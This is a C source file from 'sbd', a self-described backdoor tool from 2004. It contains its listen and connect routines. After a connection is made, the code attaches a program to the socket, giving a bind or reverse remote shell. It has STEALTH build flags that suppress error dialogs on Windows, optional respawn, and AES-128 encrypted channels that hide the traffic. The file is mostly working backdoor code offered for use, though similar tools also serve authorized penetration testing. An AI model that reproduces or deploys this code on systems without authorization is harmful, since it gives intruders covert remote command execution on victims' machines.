/*
 * sbd - shadowinteger's backdoor
 * Copyright (C) 2004 Michel Blomgren <michel.blomgren@tigerteam.se>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation; either version 2 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc., 59
 * Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 * See the COPYING file for more information.
 */

/*
 * sbd_listen() handles inbound connections
 */
int sbd_listen(int lport) {
    #ifdef WIN32
        WORD wVersionRequested;
        WSADATA wsaData;
        SOCKET sd;
        SOCKET clisd;
        float socklib_ver;
    #else
        int sd;
        int clisd;
    #endif

    int clilen;
    int sopt;

    struct sockaddr_in sbdAddr;
    struct sockaddr_in cliAddr;


    #ifdef WIN32
        wVersionRequested = MAKEWORD(1,1);
        if (WSAStartup(wVersionRequested, &wsaData)) {
            #ifndef WINMAIN
                if (!quiet)
                    fprintf(stderr, "WSAStartup: %s\n", WSAstrerror(WSAGetLastError()));
            #else
                #ifndef STEALTH
                if (!quiet)
                    wsaerrbox("WSAStartup", WSAGetLastError());
                #endif
            #endif
            return 1;
        }
        /* check if winsock DLL supports 1.1 (or higher) */
        socklib_ver = HIBYTE(wsaData.wVersion) / 10.0;
        socklib_ver += LOBYTE(wsaData.wVersion);
        if (socklib_ver < 1.1) {
            #ifndef WINMAIN
                if (!quiet)
                    fprintf(stderr, "socket library must support 1.1 or higher\n");
            #else
                #ifndef STEALTH
                if (!quiet)
                    errbox("socket library must support 1.1 or higher");
                #endif
            #endif
            WSACleanup();
            return 1;
        }
    #endif

    /* create socket */

#ifdef WIN32
    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
#else
    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
#endif
    #ifndef WINMAIN
      if (!quiet)
        fprintf(stderr, "socket(): %s\n",
            #ifdef WIN32
                WSAstrerror(WSAGetLastError())
            #else
                strerror(errno)
            #endif
            );
    #else
        #ifndef STEALTH
        if (!quiet)
            wsaerrbox("socket()", WSAGetLastError());
        #endif
    #endif
        #ifdef WIN32
            WSACleanup();
        #endif
        return 1;
    }

    /* create sbdAddr for bind() */

    sbdAddr.sin_family = AF_INET;
    sbdAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    sbdAddr.sin_port = htons(lport);

    /* set REUSEADDR socket option */
    sopt = 1;
#ifdef WIN32
    if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char*)&sopt, sizeof(sopt))) {
#else
    if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (void*)&sopt, sizeof(sopt))) {
#endif
    #ifndef WINMAIN
      if (!quiet)
        fprintf(stderr, "setsockopt() REUSEADDR: %s\n",
            #ifdef WIN32
                WSAstrerror(WSAGetLastError())
            #else
                strerror(errno)
            #endif
            );
    #else
        #ifndef STEALTH
        if (!quiet)
            wsaerrbox("setsockopt() REUSEADDR", WSAGetLastError());
        #endif
    #endif
        #ifdef WIN32
            closesocket(sd);
            WSACleanup();
        #else
            close(sd);
        #endif
        return 1;
    }

    /* call bind() */

    if (bind(sd, (struct sockaddr*) &sbdAddr, sizeof(sbdAddr))) {
    #ifndef WINMAIN
      if (!quiet)
        fprintf(stderr, "bind(): %s\n",
            #ifdef WIN32
                WSAstrerror(WSAGetLastError())
            #else
                strerror(errno)
            #endif
            );
    #else
        #ifndef STEALTH
        if (!quiet)
            wsaerrbox("bind()", WSAGetLastError());
        #endif
    #endif
        #ifdef WIN32
            closesocket(sd);
            WSACleanup();
        #else
            close(sd);
        #endif
        return 1;
    }

    /* listen for incoming connection */

    if (listen(sd, 1)) {
    #ifndef WINMAIN
      if (!quiet)
        fprintf(stderr, "listen(): %s\n",
            #ifdef WIN32
                WSAstrerror(WSAGetLastError())
            #else
                strerror(errno)
            #endif
            );
    #else
        #ifndef STEALTH
        if (!quiet)
            wsaerrbox("listen()", WSAGetLastError());
        #endif
    #endif
        #ifdef WIN32
            closesocket(sd);
            WSACleanup();
        #else
            close(sd);
        #endif
        return 1;
    }


    if (verbose) {
        fprintf(stderr, "listening on port %u\n", (unsigned int)lport);
    }

    /* accept connection, this will block */

    clilen = sizeof(cliAddr);
#ifdef WIN32
    if ((clisd = accept(sd, (struct sockaddr*) &cliAddr, &clilen)) == INVALID_SOCKET) {
#else
    if ((clisd = accept(sd, (struct sockaddr*) &cliAddr, &clilen)) < 0) {
#endif
    #ifndef WINMAIN
      if (!quiet)
        fprintf(stderr, "accept(): %s\n",
            #ifdef WIN32
                WSAstrerror(WSAGetLastError())
            #else
                strerror(errno)
            #endif
            );
    #else
        #ifndef STEALTH
        if (!quiet)
            wsaerrbox("accept()", WSAGetLastError());
        #endif
    #endif
        #ifdef WIN32
            closesocket(sd);
            WSACleanup();
        #else
            close(sd);
        #endif
        return 1;
    }

    /* close listening socket, we won't need it */
#ifdef WIN32
    closesocket(sd);
#else
    close(sd);
#endif


    if (verbose) {
        struct sockaddr_in gsnAddr;
        int gsnlen = sizeof(struct sockaddr_in);
        struct hostent *gsnhe;

        char toaddr_unknown[] = "??";
        char fromhost_unknown[] = "n/a";
        char *toaddr = NULL;
        char *fromhost = NULL;

        if (getsockname(clisd, (struct sockaddr*) &gsnAddr, &gsnlen)) {
            /* handle error */
            #ifndef WINMAIN
              if (!quiet)
                fprintf(stderr, "getsockname(): %s\n",
                    #ifdef WIN32
                        WSAstrerror(WSAGetLastError())
                    #else
                        strerror(errno)
                    #endif
                    );
            #else
                #ifndef STEALTH
                if (!quiet)
                    wsaerrbox("getsockname()", WSAGetLastError());
                #endif
            #endif
        } else {
            /* ok */
            toaddr = strdup(inet_ntoa(gsnAddr.sin_addr));
        }

        if (!toaddr) {
            toaddr = toaddr_unknown;
        }

        if (use_dns) {
            if (!(gsnhe = gethostbyaddr((unsigned char *)&cliAddr.sin_addr.s_addr,
                        sizeof(cliAddr.sin_addr.s_addr), AF_INET))) {
                /* handle error */
                #ifndef WINMAIN
                  if (!quiet)
                    fprintf(stderr, "reverse lookup of %s failed: %s\n",
                        inet_ntoa(cliAddr.sin_addr),
                        #ifdef WIN32
                            WSAstrerror(WSAGetLastError())
                        #else
                            hstrerror(h_errno)
                        #endif
                        );
                #else
                    #ifndef STEALTH
                    if (!quiet)
                        wsaerrbox(inet_ntoa(sbdAddr.sin_addr), WSAGetLastError());
                    #endif
                #endif

                fromhost = fromhost_unknown;
            } else {
                /* ok */
                fromhost = (char *)gsnhe->h_name;
            }
        } else {
            fromhost = fromhost_unknown;
        }

        fprintf(stderr, "connect to %s:%u from %s:%u (%s)\n",
            toaddr, (unsigned int)lport, inet_ntoa(cliAddr.sin_addr),
            ntohs(cliAddr.sin_port), fromhost);
    }



    /* if we're using AES-128 encryption, initialize the server part */

    if (use_encryption) {
        if (pel_server_init(clisd, aes_secret) != PEL_SUCCESS) {
        #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "authentication failed (aes-cbc-128)\n");
        #else
            #ifndef STEALTH
            if (!quiet)
                errbox("authentication failed (aes-cbc-128)");
            #endif
        #endif
            #ifdef WIN32
                closesocket(clisd);
                WSACleanup();
            #else
                close(clisd);
            #endif
            return 2;
        }
    }

    /* if there's a program to execute, we do just that */

    #ifndef WIN32
        /* ignore "Broken pipe" */
        signal(SIGPIPE, SIG_IGN);
    #endif

    if (program_to_execute) {
        if (verbose && program_to_execute) {
            fprintf(stderr, "executing: %s\n", program_to_execute);
        }

        doexec(clisd);

        /* doexec closes the socket when done */
        #ifndef WINMAIN
            if (verbose) {
                fprintf(stderr, "connection closed\n");
            }
        #endif
    } else {
        readwrite(clisd);
        #ifdef WIN32
            closesocket(clisd);
        #else
            close(clisd);
        #endif
    }

    #ifndef WIN32
        /* restore default OS behaviour
           ("Broken pipe" messages at least under Linux and *BSD)
         */
        signal(SIGPIPE, SIG_DFL);
    #endif

#ifdef WIN32
    WSACleanup();
#endif
    return 0;
}


/*
 * sbd_connect() handles outbound connections
 */
int sbd_connect(char *chost, int cport, int mysport) {
    #ifdef WIN32
        WORD wVersionRequested;
        WSADATA wsaData;
        SOCKET sd;
        float socklib_ver;
    #else
        int sd;
    #endif

    int sopt;
    struct hostent *he = NULL;
    struct sockaddr_in sbdAddr;
    struct sockaddr_in bindAddr;

    char *arpa_host = NULL;


    #ifdef WIN32
        wVersionRequested = MAKEWORD(1,1);
        if (WSAStartup(wVersionRequested, &wsaData)) {
            #ifndef WINMAIN
                if (!quiet)
                    fprintf(stderr, "WSAStartup: %s\n", WSAstrerror(WSAGetLastError()));
            #else
                #ifndef STEALTH
                if (!quiet)
                    wsaerrbox("WSAStartup", WSAGetLastError());
                #endif
            #endif
            return 1;
        }
        /* check if winsock DLL supports 1.1 (or higher) */
        socklib_ver = HIBYTE(wsaData.wVersion) / 10.0;
        socklib_ver += LOBYTE(wsaData.wVersion);
        if (socklib_ver < 1.1) {
            #ifndef WINMAIN
                if (!quiet)
                    fprintf(stderr, "socket library must support 1.1 or higher\n");
            #else
                #ifndef STEALTH
                if (!quiet)
                    errbox("socket library must support 1.1 or higher");
                #endif
            #endif
            WSACleanup();
            return 1;
        }
    #endif


    /* resolve hostname */

    /* fist check if it's an ip address or a hostname */

    sbdAddr.sin_addr.s_addr = inet_addr(chost);
    if (sbdAddr.sin_addr.s_addr == INADDR_NONE) {
            /* it seems to be a hostname */

        if (!use_dns) {
            fprintf(stderr, "warning: resolving \"%s\" even though you specified -n\n", chost);
        }

        if (!(he = gethostbyname(chost))) {
        #ifndef WINMAIN
          if (!quiet)
            fprintf(stderr, "failed to resolve %s: %s\n", chost,
                #ifdef WIN32
                    WSAstrerror(WSAGetLastError())
                #else
                    hstrerror(h_errno)
                #endif
                );
        #else
            #ifndef STEALTH
            if (!quiet)
                wsaerrbox(chost, WSAGetLastError());
            #endif
        #endif
            #ifdef WIN32
                WSACleanup();
            #endif
            return 2;
        }

        /* create sbdAaddr */
        sbdAddr.sin_family = he->h_addrtype;
        memcpy(&(sbdAddr.sin_addr), he->h_addr, he->h_length);

        if (verbose) {  /* in addition, do reverse lookup of ip */
            if (use_dns) {
                if (!(he = gethostbyaddr((unsigned char *)&sbdAddr.sin_addr.s_addr,
                            sizeof(sbdAddr.sin_addr.s_addr), AF_INET))) {
                    /* handle error */
                    #ifndef WINMAIN
                      if (!quiet)
                        fprintf(stderr, "reverse lookup of %s failed: %s\n",
                            inet_ntoa(sbdAddr.sin_addr),
                            #ifdef WIN32
                                WSAstrerror(WSAGetLastError())
                            #else
                                hstrerror(h_errno)
                            #endif
                            );
                    #else
                        #ifndef STEALTH
                        if (!quiet)
                            wsaerrbox(inet_ntoa(sbdAddr.sin_addr), WSAGetLastError());
                        #endif
                    #endif

                    arpa_host = chost;
                } else {
                    /* ok */
                    if (!(arpa_host = strdup((const char *)he->h_name))) {
                        arpa_host = chost;
                    }
                }
            } else {
                arpa_host = chost;
            }
        }

    } else {
        /* else it seems to be an ip address */
        /* create sbdAaddr */
        sbdAddr.sin_family = AF_INET;
        /* sbdAddr.sin_addr.s_addr has already been filled in above */

        if (verbose) {  /* do reverse lookup */
            if (use_dns) {
                if (!(he = gethostbyaddr((unsigned char *)&sbdAddr.sin_addr.s_addr,
                            sizeof(sbdAddr.sin_addr.s_addr), AF_INET))) {
                    /* handle error */
                    #ifndef WINMAIN
                      if (!quiet)
                        fprintf(stderr, "reverse lookup of %s failed: %s\n",
                            inet_ntoa(sbdAddr.sin_addr),
                            #ifdef WIN32
                                WSAstrerror(WSAGetLastError())
                            #else
                                hstrerror(h_errno)
                            #endif
                            );
                    #else
                        #ifndef STEALTH
                        if (!quiet)
                            wsaerrbox(inet_ntoa(sbdAddr.sin_addr), WSAGetLastError());
                        #endif
                    #endif

                    arpa_host = chost;
                } else {
                    /* ok */
                    if (!(arpa_host = strdup((const char *)he->h_name))) {
                        arpa_host = chost;
                    }
                }
            } else {
                arpa_host = chost;
            }
        }
    }
    sbdAddr.sin_port = htons(cport);


    /* create socket */

#ifdef WIN32
    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
#else
    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
#endif
    #ifndef WINMAIN
      if (!quiet)
        fprintf(stderr, "socket(): %s\n",
            #ifdef WIN32
                WSAstrerror(WSAGetLastError())
            #else
                strerror(errno)
            #endif
            );
    #else
        #ifndef STEALTH
        if (!quiet)
            wsaerrbox("socket()", WSAGetLastError());
        #endif
    #endif
        #ifdef WIN32
            WSACleanup();
        #endif
        return 1;
    }


    /* if sport is > 0 && <= 65535, attempt to bind() to sport */

    if ((mysport) && (mysport <= 65535)) {
        bindAddr.sin_family = AF_INET;
        bindAddr.sin_addr.s_addr = htonl(INADDR_ANY);
        bindAddr.sin_port = htons(mysport);

        /* set REUSEADDR socket option */
        sopt = 1;
    #ifdef WIN32
        if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char*)&sopt, sizeof(sopt))) {
    #else
        if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (void*)&sopt, sizeof(sopt))) {
    #endif
        #ifndef WINMAIN
          if (!quiet)
            fprintf(stderr, "setsockopt() REUSEADDR: %s\n",
                #ifdef WIN32
                    WSAstrerror(WSAGetLastError())
                #else
                    strerror(errno)
                #endif
                );
        #else
            #ifndef STEALTH
            if (!quiet)
                wsaerrbox("setsockopt() REUSEADDR", WSAGetLastError());
            #endif
        #endif
            #ifdef WIN32
                closesocket(sd);
                WSACleanup();
            #else
                close(sd);
            #endif
            return 2;
        }

        /* bind to custom source port */
        if (bind(sd, (struct sockaddr*) &bindAddr, sizeof(bindAddr))) {
        #ifndef WINMAIN
          if (!quiet)
            fprintf(stderr, "bind(): %s\n",
                #ifdef WIN32
                    WSAstrerror(WSAGetLastError())
                #else
                    strerror(errno)
                #endif
                );
        #else
            #ifndef STEALTH
            if (!quiet)
                wsaerrbox("bind()", WSAGetLastError());
            #endif
        #endif
            #ifdef WIN32
                closesocket(sd);
                WSACleanup();
            #else
                close(sd);
            #endif
            return 2;
        }
    }


    if (verbose) {
        char tempbuf[128];
        char *ascii_ip = inet_ntoa(sbdAddr.sin_addr);
        tempbuf[0] = 0;

        if ((!strcasecmp(chost, arpa_host))) {
            /* if chost == arpa_host no need to parse in arpa_host */
            snprintf(tempbuf, sizeof(tempbuf)-1, "connecting to %s [%s], port %u",
                chost, ascii_ip,
                (unsigned int)cport);
        } else {
            /* chost != arpa_host, parse in both */
            snprintf(tempbuf, sizeof(tempbuf)-1, "connecting to %s (%s) [%s], port %u",
                chost, arpa_host, ascii_ip,
                (unsigned int)cport);
        }

        if (mysport) {
            snprintf(&tempbuf[strlen(tempbuf)], sizeof(tempbuf)-strlen(tempbuf),
                " (from source port %u)", (unsigned int)mysport);

        }
        fprintf(stderr, "%s\n", tempbuf);
    }

    /* connect */

    if (connect(sd, (struct sockaddr*)&sbdAddr, sizeof(sbdAddr))) {
    #ifndef WINMAIN
      if (!quiet)
        fprintf(stderr, "connect(): %s\n",
            #ifdef WIN32
                WSAstrerror(WSAGetLastError())
            #else
                strerror(errno)
            #endif
            );
    #else
        #ifndef STEALTH
        if ((!quiet) && (!respawn_enabled))
            wsaerrbox("connect()", WSAGetLastError());
        #endif
    #endif
        #ifdef WIN32
            closesocket(sd);
            WSACleanup();
        #else
            close(sd);
        #endif
        return 2;
    }


    if (verbose) {
        fprintf(stderr, "connected to %s:%u\n",
            inet_ntoa(sbdAddr.sin_addr),
            (unsigned int)cport);

    }

    /* we've got a connection */

    /* if we're using AES-128 encryption, initialize the client part */
    if (use_encryption) {
        if (pel_client_init(sd, aes_secret) != PEL_SUCCESS) {
        #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "authentication failed (aes-cbc-128)\n");
        #else
            #ifndef STEALTH
            if (!quiet)
                errbox("authentication failed (aes-cbc-128)");
            #endif
        #endif
            #ifdef WIN32
                closesocket(sd);
                WSACleanup();
            #else
                close(sd);
            #endif
            return 2;
        }
    }

    /* if there's a program to execute, we do just that */

    if (program_to_execute) {
        doexec(sd);
        /* doexec closes the socket when done */
        #ifndef WINMAIN
            if (verbose) {
                fprintf(stderr, "connection closed\n");
            }
        #endif
    } else {
        readwrite(sd);
        #ifdef WIN32
            closesocket(sd);
        #else
            close(sd);
        #endif
    }

#ifdef WIN32
    WSACleanup();
#endif
    return 0;
}
